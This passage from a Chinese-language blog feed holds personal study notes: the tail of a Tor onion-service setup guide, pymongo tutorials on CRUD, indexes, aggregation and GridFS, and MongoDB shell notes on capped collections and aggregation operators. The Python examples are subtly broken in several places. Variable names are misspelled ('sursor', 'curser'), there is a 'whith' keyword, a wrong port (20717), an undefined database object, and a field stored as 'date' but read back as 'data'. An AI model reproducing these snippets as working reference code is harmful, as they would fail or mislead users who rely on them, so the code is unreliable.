class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line">最后加下面这两行</span><br><span class="line">deb https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br><span class="line">deb-src https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br></pre></td></tr></table></figure></li><li><p>添加密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org&#x2F;A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import</span><br><span class="line">gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -</span><br></pre></td></tr></table></figure></li><li><p>安装tor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">sudo apt-get install tor</span><br></pre></td></tr></table></figure></li><li><p>dns选择</p><p> 默认是deb.torproject.org<br> 备选的有deb-master.torproject.org、mirror.netcologne.de、tor.mirror.youam.de</p></li><li><p>编辑tor配置文件</p><p> vi /etc/tor/torrc<br> 添加<br> HiddenServiceDir /var/lib/tor/hidden_service/<br> HiddenServicePort 80 127.0.0.1:8080</p></li><li><p>启动tor</p><p> <code>sudo service tor start</code><br> 一旦启动，那么你的域名也就生成了</p></li><li><p>查看onion域名</p><p> cat /var/lib/tor/hidden_service/hostname</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Darknet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暗网 </tag>
            
            <tag> onion </tag>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过Python操作MongoDB数据库</title>
      <link href="/2018/03/18/MongoDB/%E9%80%9A%E8%BF%87Python%E6%93%8D%E4%BD%9CMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2018/03/18/MongoDB/%E9%80%9A%E8%BF%87Python%E6%93%8D%E4%BD%9CMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h4 id="Python操作MongoDB需要安装pymongo库"><a href="#Python操作MongoDB需要安装pymongo库" class="headerlink" title="Python操作MongoDB需要安装pymongo库"></a><strong>Python操作MongoDB需要安装pymongo库</strong></h4><ul><li><p><strong>安装</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install pymongo</span><br></pre></td></tr></table></figure></li><li><p><strong>操作步骤</strong></p><ol><li>创建mongo数据库的连接对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn&#x3D;MongoClient(&#39;localhost&#39;,27017)</span><br></pre></td></tr></table></figure></li><li>生成数据库对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db&#x3D;conn.stu</span><br></pre></td></tr></table></figure></li><li>生成集合对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_set&#x3D;db.class0</span><br></pre></td></tr></table></figure></li><li>增删改查索引聚合操作<ul><li><strong>插入数据</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_set.insert()</span><br><span class="line">my_set.insert_many()</span><br><span class="line">my_set.insert_one()</span><br><span class="line">my_set.save()</span><br></pre></td></tr></table></figure></li><li><strong>删除数据</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_set.remove(&#123;&#125;,multi &#x3D; True)#multi默认为True 表示删除所有符合条件的数据,设置为False 表示只删除一条</span><br></pre></td></tr></table></figure></li><li><strong>查找数据</strong></li><li><code>find()</code></li><li>功能: 查找数据库内容</li><li>参数: 同mongo shell find()</li><li>返回值: 返回一个游标 –&gt; 迭代器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cursor#可迭代对象属性函数</span><br><span class="line">next()</span><br><span class="line">count()</span><br><span class="line">limit()</span><br><span class="line">skip()</span><br><span class="line">sort()</span><br><span class="line">mongoshell --&gt;sort(&#123;&#39;name&#39;:1&#125;)</span><br><span class="line">pymongo--&gt;sort([(&#39;name&#39;,1)])</span><br></pre></td></tr></table></figure></li><li>进行排序时游标要确保没有被访问过</li><li><code>find_one()</code></li><li>返回值是一个字典</li><li><strong>修改操作</strong></li><li><code>update()</code><ul><li>参数和mongoshell 中 update相同</li><li><code>update_many()</code> : 匹配到多个文档时全部修改</li><li><code>update_one()</code> : 只修改匹配到的第一条文档</li><li>编程中mongo的数据类型null可以用Python中的None替代<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建连接对象</span></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">27017</span>)</span><br><span class="line"><span class="comment">#创建数据库对象和集合对象</span></span><br><span class="line"><span class="comment">#db=conn.stu</span></span><br><span class="line"><span class="comment">#my_set=db.class3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __getitem__  __setitem__</span></span><br><span class="line">db=conn[<span class="string">'stu'</span>]</span><br><span class="line">my_set=db[<span class="string">'class3'</span>]</span><br><span class="line"></span><br><span class="line">print(my_set)</span><br><span class="line">print(dir(my_set))</span><br><span class="line"></span><br><span class="line"><span class="comment">#插入数据</span></span><br><span class="line">my_set.insert(&#123;<span class="string">'name'</span>:<span class="string">'HelloKitty'</span>,<span class="string">'age'</span>:<span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除数据</span></span><br><span class="line">my_set.remove(&#123;<span class="string">'name'</span>:<span class="string">'HelloKitty'</span>&#125;,multi = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除所有文档</span></span><br><span class="line"><span class="comment">#my_set.remove()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找数据</span></span><br><span class="line">sursor=my_set.find(&#123;&#125;,&#123;<span class="string">'_id'</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i[<span class="string">'name'</span>],<span class="string">'----'</span>,i[<span class="string">'age'</span>])</span><br><span class="line"></span><br><span class="line">cls=db.class0</span><br><span class="line">cursor=cls.find(&#123;<span class="string">'gender'</span>:&#123;<span class="string">'$exists'</span>:<span class="literal">True</span>&#125;&#125;,&#123;<span class="string">'_id'</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">print(cursor)</span><br><span class="line">print(cursor.next())</span><br><span class="line">print(cursor.count())</span><br><span class="line"><span class="comment">#for i in cursor.skip(2).limit(3):</span></span><br><span class="line"><span class="comment">#print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> curser.sort([(<span class="string">'name'</span>,<span class="number">1</span>)]):</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">dic=&#123;<span class="string">'$or'</span>:[&#123;<span class="string">'name'</span>:&#123;<span class="string">'$gt'</span>:<span class="string">'Tom'</span>&#125;&#125;,&#123;<span class="string">'gender'</span>:<span class="string">'w'</span>&#125;]&#125;</span><br><span class="line">data=cls.find_one(dic)</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改数据</span></span><br><span class="line">my_set.update(&#123;<span class="string">'name'</span>:<span class="string">'Lily'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'name'</span>:<span class="string">'amy'</span>&#125;&#125;)</span><br><span class="line">my_set.update(&#123;<span class="string">'name'</span>:<span class="string">'abby'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'King'</span>:<span class="string">'amy'</span>&#125;&#125;,upsert=<span class="literal">True</span>)</span><br><span class="line">my_set.update(&#123;<span class="string">'King'</span>:<span class="string">'amy'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'age'</span>:<span class="number">16</span>&#125;&#125;,multi=<span class="literal">True</span>)</span><br><span class="line">my_set.update_many(&#123;<span class="string">'King'</span>:<span class="string">'amy'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'king_name'</span>:<span class="string">'abby'</span>&#125;&#125;)</span><br><span class="line">my_set.update_one(&#123;<span class="string">'king_name'</span>:<span class="literal">None</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'king_name'</span>:<span class="string">'lisa'</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找并删除,查找结果会返回</span></span><br><span class="line">print(my_set.find_one_and_delete(&#123;<span class="string">'name'</span>:<span class="string">'abby'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭数据库连接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ol></li></ul><h4 id="索引操作"><a href="#索引操作" class="headerlink" title="索引操作"></a><strong>索引操作</strong></h4><ul><li><p>创建索引</p><ul><li><code>ensure_index()</code></li></ul></li><li><p>查看集合中的索引</p><ul><li><code>list_indexes()</code></li></ul></li><li><p>删除索引</p><ul><li><code>drop_index()</code> 删除某一个索引</li><li><code>drop_indexes()</code> 删除所有索引<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">27017</span>)</span><br><span class="line">db=conn.stu</span><br><span class="line">my_set=db.class3</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建索引</span></span><br><span class="line">index=my_set.ensure_index(name)</span><br><span class="line"><span class="comment">#返回索引名称</span></span><br><span class="line">print(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#复合索引</span></span><br><span class="line">index1=my_set.ensure_index([(<span class="string">'name'</span>,<span class="number">1</span>),(<span class="string">'king'</span>,<span class="number">-1</span>)])</span><br><span class="line">print(index1)</span><br><span class="line"></span><br><span class="line">cls=db.class0</span><br><span class="line"><span class="comment">#唯一索引和稀疏索引</span></span><br><span class="line"><span class="comment">#index=cls.ensure_index('name',unique=True)</span></span><br><span class="line"><span class="comment">#print(index)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#index=my_set.ensure_index('king_name',sparse=True)</span></span><br><span class="line"><span class="comment">#print(index)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看一个集合中的索引</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_set.list_indexes():</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除一个索引</span></span><br><span class="line">my_set.drop_index(<span class="string">'name'</span>)</span><br><span class="line">my_set.drop_indexes()</span><br><span class="line"></span><br><span class="line"><span class="comment">#同时创建多个索引</span></span><br><span class="line">index1=IndexModel([(<span class="string">'name'</span>,<span class="number">1</span>),(<span class="string">'king'</span>,<span class="number">-1</span>)])</span><br><span class="line">index2=IndexModel([(<span class="string">'king_name'</span>,<span class="number">1</span>)])</span><br><span class="line">indexes=my_set.create_indexes([index1,index2])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 聚合管道</span></span><br><span class="line"></span><br><span class="line">l=[&#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:<span class="string">'$king'</span>,<span class="string">'count'</span>:&#123;<span class="string">'$sum'</span>:<span class="number">1</span>&#125;&#125;&#125;,&#123;<span class="string">'$match'</span>:&#123;<span class="string">'count'</span>:&#123;<span class="string">'$gt'</span>:<span class="number">1</span>&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">cursor=my_set.aggregate(l)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="聚合操作"><a href="#聚合操作" class="headerlink" title="聚合操作"></a><strong>聚合操作</strong></h4><ul><li><code>aggregate([])</code></li><li>参数与mongoshell中聚合参数写法一致</li><li>返回值: 迭代器同find的返回值<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 聚合管道</span></span><br><span class="line"></span><br><span class="line">l=[&#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:<span class="string">'$king'</span>,<span class="string">'count'</span>:&#123;<span class="string">'$sum'</span>:<span class="number">1</span>&#125;&#125;&#125;,&#123;<span class="string">'$match'</span>:&#123;<span class="string">'count'</span>:&#123;<span class="string">'$gt'</span>:<span class="number">1</span>&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">cursor=my_set.aggregate(l)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure></li></ul><h4 id="文件存储及提取"><a href="#文件存储及提取" class="headerlink" title="文件存储及提取"></a><strong>文件存储及提取</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用来获取数据库中gridfs的存储文件 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="comment">#和pymongo绑定的</span></span><br><span class="line"><span class="keyword">import</span> gridfs</span><br><span class="line"></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">20717</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fs=gridfs.GridFS(db)</span><br><span class="line"></span><br><span class="line">files=fs.find()</span><br><span class="line">print(files)</span><br><span class="line">print(files.count())</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">print(file.filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line"><span class="keyword">if</span> file.filename==<span class="string">'abc.mp3'</span>:</span><br><span class="line"><span class="keyword">with</span> open(file.filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">whith <span class="literal">True</span>:</span><br><span class="line">data=file.read(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f.write(data)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p><strong>小文件操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将文件以二进制存储到数据库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> bson.binary</span><br><span class="line"></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">27017</span>)</span><br><span class="line">db=conn.file</span><br><span class="line">my_set=db.img</span><br><span class="line"></span><br><span class="line"><span class="comment">#存储</span></span><br><span class="line">f=open(<span class="string">'img.jpg'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="comment">#将读取的二进制流变为bson格式二进制字串</span></span><br><span class="line"></span><br><span class="line">content=bson.binary.Binary(f.read())</span><br><span class="line"></span><br><span class="line">my_set.insert(&#123;<span class="string">'filename'</span>:<span class="string">'img.jpg'</span>,<span class="string">'date'</span>:content&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#提取文件</span></span><br><span class="line">data=my_set.find_one(&#123;<span class="string">'filename'</span>:<span class="string">'img.jpg'</span>&#125;)</span><br><span class="line"><span class="keyword">with</span> open(data[<span class="string">'filename'</span>],<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(data[<span class="string">'data'</span>])</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> Python </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> mongodb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB固定集合和文件存储</title>
      <link href="/2018/03/18/MongoDB/MongoDB%E5%9B%BA%E5%AE%9A%E9%9B%86%E5%90%88%E5%92%8C%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8/"/>
      <url>/2018/03/18/MongoDB/MongoDB%E5%9B%BA%E5%AE%9A%E9%9B%86%E5%90%88%E5%92%8C%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="固定集合"><a href="#固定集合" class="headerlink" title="固定集合"></a><strong>固定集合</strong></h4><ul><li><p>mongo中可以创建大小固定的集合,称之为固定集合,固定集合的性能出色,适用于很多场景</p></li><li><p>比如: 日志处理, 临时缓存</p></li><li><p>特点: </p><ul><li>插入速度快</li><li>顺序查询速度快</li><li>能够淘汰早期数据</li><li>可以控制集合空间</li></ul></li><li><p>创建: </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.createCollection(collectionName,&#123;capped:true,size:10000,max:1000&#125;)</span><br></pre></td></tr></table></figure><ul><li>size: 设置固定集合的大小,单位 <code>Kb</code></li><li>max: 最多能容纳多少文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e.g.创建一个最多包含三条文档的集合</span><br><span class="line">db.createCollection(&#39;log&#39;,&#123;capped:true,size:10,max:3&#125;)</span><br><span class="line">db.log.insert(&#123;&#39;host&#39;:&#39;1.1.1.1&#39;&#125;)</span><br><span class="line">db.log.insert(&#123;&#39;host&#39;:&#39;1.1.1.2&#39;&#125;)</span><br><span class="line">db.log.insert(&#123;&#39;host&#39;:&#39;1.1.1.3&#39;&#125;)</span><br><span class="line">#当插入第4条自动把第一条删除</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a><strong>文件存储</strong></h4><ul><li><p>数据库存储文件的方式</p><ol><li><p>在数据库中以字符串的方式存储文件在本地的路径</p><ul><li>优点: 节省数据库空间</li><li>缺点: 当数据库或者文件位置发生变化即需要相应修改数据库内容</li></ul></li><li><p>将文件以二进制数据的方式存放在数据库里</p><ul><li>优点: 文件存入数据库,数据库在,即文件不会丢失</li><li>缺点: 当文件较大时,数据库空间占用大,提取困难</li></ul></li></ol></li><li><p>mongo中使用 <strong>GridFS</strong>方案 进行大文件存储</p></li><li><p>GridFS: 是mongodb中大文件存储的一种方案,mongo中认为大于16M的文件为大文件</p></li><li><p>方案解释:</p><ul><li>在mongodb中,创建两个集合,共同完成对文件的存储</li><li>fs.files: cunc文件的相关信息,比如: 文件名,文件类型</li><li>fs.chunks: 实际存储文件内容,以二进制方式分块存储,将大文件分为多个小块,每块占一个空间 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongofiles -d DBName put xxx.zip</span><br><span class="line"> 数据库名 要存储的文件</span><br></pre></td></tr></table></figure></li><li>如果数据库不存在则自动创建<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mongofiles -d code put hellopython.py</span><br><span class="line">mongo</span><br><span class="line">use code</span><br><span class="line">db.fs.files.find(&#123;&#125;,&#123;_id:0&#125;)</span><br><span class="line">db.fs.chunks.find(&#123;&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li><li>获取数据库中文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongofiles -d grid get hellopython.py</span><br></pre></td></tr></table></figure></li><li>优点: 存储方便,方便数据库移植,对文件个数没有太多限制</li><li>缺点: 读写效率低</li></ul></li></ul><h4 id="游标"><a href="#游标" class="headerlink" title="游标"></a><strong>游标</strong></h4><ul><li>为什么使用游标<ol><li>防止网络拥塞,造成数据传输慢</li><li>提高用户解析体验,可以后端解析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var cursor &#x3D; db.class0.find()#创建游标</span><br><span class="line">cursor.hasNext()#查看是否有下一个数据</span><br><span class="line">cursor.next()#获取下一个数据</span><br></pre></td></tr></table></figure></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
            <tag> 游标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB聚合</title>
      <link href="/2018/03/17/MongoDB/MongoDB%E8%81%9A%E5%90%88/"/>
      <url>/2018/03/17/MongoDB/MongoDB%E8%81%9A%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h4 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a><strong>聚合</strong></h4><ul><li><p>对数据文档进行整理统计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.aggregate()</span><br></pre></td></tr></table></figure></li><li><p>功能: 聚合函数,配合聚合条件进行数据整理统计</p></li><li><p>参数: 聚合条件</p></li><li><p><strong>分组操作符</strong></p></li></ul><p><strong>$group</strong> 分组 和分组操作符配合使用确定按什么分组</p><ul><li><strong>分组操作符</strong> (和$group配合)</li></ul><p><strong>$sum</strong> 求和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e.g.统计每组个数</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$sum:1&#125;&#125;&#125;)</span><br><span class="line">聚合分组按gender分组num为统计结果名</span><br><span class="line"></span><br><span class="line">e.g.统计每组年龄和</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$sum:&#39;$age&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$avg</strong> 求平均数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.求平均年龄</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$avg:&#39;$age&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$min</strong> 求最小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.求每组姓名的最小值</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$min:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$max</strong> 求最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.求每组姓名的最大值</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$max:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$first</strong>    返回每组第一个文档指定域值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$first:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$last</strong> 返回每组最后一个文档指定域值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$last:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><ul><li><p><strong>$project</strong></p></li><li><p>用于修饰文档的显示结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$project:&#123;_id:0,name:1,age:1&#125;&#125;)</span><br><span class="line">db.class0.aggregate(&#123;$project:&#123;_id:0,Name:&#39;$name&#39;,Age:&#39;$age&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$match</strong> 过滤数据</p></li><li><p>操作符的值同find的query</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$match:&#123;name:&#123;$gt:&#39;Tom&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$skip</strong> 跳过前几条文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 